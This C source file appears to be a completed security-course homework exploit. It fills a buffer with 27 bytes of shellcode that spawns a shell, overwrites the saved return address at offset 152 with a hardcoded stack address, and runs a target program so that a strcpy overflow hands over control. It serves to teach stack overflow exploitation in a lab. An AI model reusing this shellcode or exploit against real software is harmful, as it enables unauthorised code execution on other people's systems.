#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

// replace this define environment to have the correct path of your own target code
// note that you must have the target executable generated first (by using 'make' command)
#define TARGET "/home/net/re876928/homework/project1/targets/target"

int main(void)
{
  char *args[3];
  char *env[2];
  char *tmp = NULL;

  // Creating an input buffer that can cause buffer overflow in strcpy function in the target executable
  int buffSize = 1000; char buff[buffSize]; 
  // Intialize buffer elements to 0x01
  int i;   for (i=0; i < buffSize; i++) 	buff[i] = 0x01;

  // write your code below to fill the 27 bytes shellcode into the buff variable and 
  // overwrite the return address correctly in order to achieve stack overflow
  // Your own code starts here:
  buff[0]=0x31;buff[1]=0xc0;buff[2]=0x48;buff[3]=0xbb;
  buff[4]=0xd1;buff[5]=0x9d;buff[6]=0x96;buff[7]=0x91;
  buff[8]=0xd0;buff[9]=0x8c;buff[10]=0x97;buff[11]=0xff;
  buff[12]=0x48;buff[13]=0xf7;buff[14]=0xdb;buff[15]=0x53;
  buff[16]=0x54;buff[17]=0x5f;buff[18]=0x99;buff[19]=0x52;
  buff[20]=0x57;buff[21]=0x54;buff[22]=0x5e;buff[23]=0xb0;
  buff[24]=0x3b;buff[25]=0x0f;buff[26]=0x05;

  buff[152]=0xb0;buff[153]=0xeb;
  buff[154]=0xff;buff[155]=0xff;
  buff[156]=0xff;buff[157]=0x7f; //random:0x7fffffffe8f8 - 0x7fffffffe860 = 152
  buff[158]=0x00;               // re-run:0x7fffffffd9d8 - 0x7fffffffd940 = 0x98 = 152
  
  
  
  
  // Your code ends here.
  
  // prepare command line input to execute target code
  args[0] = TARGET; 
  args[1] = buff; // the first input parameter to the target code
  args[2] = NULL;
  env[0] = "FOO=bar"; 
  env[1] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
   return 0;
}
